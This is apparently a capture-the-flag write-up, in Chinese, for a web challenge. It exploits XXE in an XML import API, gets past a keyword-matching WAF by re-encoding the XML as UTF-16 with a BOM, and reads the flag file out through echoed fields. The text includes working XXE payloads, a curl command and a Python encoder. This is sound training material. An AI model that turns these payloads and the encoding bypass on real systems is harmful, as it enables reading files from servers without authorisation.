# a-07 · 探索记录

对应题解：[`a-07.md`](./a-07.md)。

## 目标与起点

题目说「图片资源管理，支持 XML 批量导入，开发为了方便调试加了便捷功能」。中等难度，300 分。

启动后是首页，注册/登录后进工作台。

## 第一阶段：首页注释

首页 HTML 底部有一段开发者注释，三行全是线索：

```html
<!--
管理员调试说明：
- 管理后台入口: /index.php?action=admin
- API 调试: 可通过 X-Admin-Key 请求头访问管理功能
- XML 导入支持外部实体解析，方便引用外部资源
-->
```

- `action=admin` + `X-Admin-Key` 是一条线（需要 Key，未继续）。
- **「XML 导入支持外部实体解析」是 XXE 的直接提示**，优先做这条。

## 第二阶段：摸清导入接口

注册 `img1/pass1234` → 登录 → 工作台有「批量导入」。导入页的 JS：

```js
fetch('api.php?endpoint=import', {
  method: 'POST',
  headers: { 'Content-Type': 'application/xml' },
  body: xmlContent          // 文本框内容原样作为 body
})
```

不是文件上传，是原始 XML body。返回 JSON 并把解析结果回显：

```json
{"success":true,"message":"成功导入 1 个图片配置",
 "images":[{"title":"...","description":"...","category":"...","path":"..."}]}
```

**回显字段（title/description）就是外带通道。**

## 第三阶段：第一次 XXE（被 WAF 拦）

```xml
<?xml version="1.0"?>
<!DOCTYPE images [ <!ENTITY xxe SYSTEM "file:///challenge/flag.txt"> ]>
<images><image><title>&xxe;</title><description>d</description>
<category>c</category><path>/uploads/a.jpg</path></image></images>
```

```bash
curl -b cj -H 'Content-Type: application/xml' --data-binary @xxe1.xml \
  'http://$T/api.php?endpoint=import'
# {"success":false,"message":"检测到潜在的恶意内容，XML 解析已阻止","waf":true}
```

WAF 是**明文关键字匹配**（`DOCTYPE`/`ENTITY`/`SYSTEM`）。

## 第四阶段：编码绕过（一次成功）

XML 解析器支持多种编码，WAF 只看原始字节。把同一份 XML 用 UTF-16 + BOM 发送：

```python
xml = '''<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE images [ <!ENTITY xxe SYSTEM "file:///challenge/flag.txt"> ]>
<images><image><title>&xxe;</title><description>d</description><category>c</category><path>/uploads/a.jpg</path></image></images>'''
open('xxe16.xml','wb').write(b'\xff\xfe' + xml.encode('utf-16-le'))     # LE
open('xxe16be.xml','wb').write(b'\xfe\xff' + xml.encode('utf-16-be'))   # BE
```

两个都成功：

```json
{"success":true,"images":[{"title":"flag{53be8e0b-a33a-4c83-92ba-1250a8421a29}", ...}]}
```

没有用 OOB、没有搭 DTD 服务器、没有试协议封装——**回显足够**。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| UTF-8 明文 DOCTYPE/ENTITY | 被 WAF 拦 | `检测到潜在的恶意内容` |
| **UTF-16LE + BOM** | 成功 | WAF 匹配不到明文，libxml 正常解析 |
| **UTF-16BE + BOM** | 成功 | 同上 |
| `X-Admin-Key` 管理接口 | 未继续 | 没有拿到 Key，XXE 已足够 |
| `action=admin` | 未继续 | 同上 |

## 这次真正的收获

1. **HTML 注释经常是题面。** 三行注释里两行是攻击面，先读注释再扫目录。
2. **WAF 按原始字节匹配，解析器按声明解码。** 两者理解不一致就是绕过空间；UTF-16 + BOM 是最省事的 XXE 绕过。
3. **优先找回显，再考虑 OOB。** 导入/解析类接口通常会把字段回显，实体放进去就完成了外带，比搭 DTD 服务器便宜一个数量级。
4. **BOM 和 `encoding` 声明必须一致。** LE 用 `\xff\xfe`、BE 用 `\xfe\xff`，声明对应 `UTF-16`（或 `UTF-16LE`/`UTF-16BE`）。
5. **一条链能拿到 flag 就够了。** 首页同时给了「管理员调试入口」，不必为了完整性把每条线都走完。
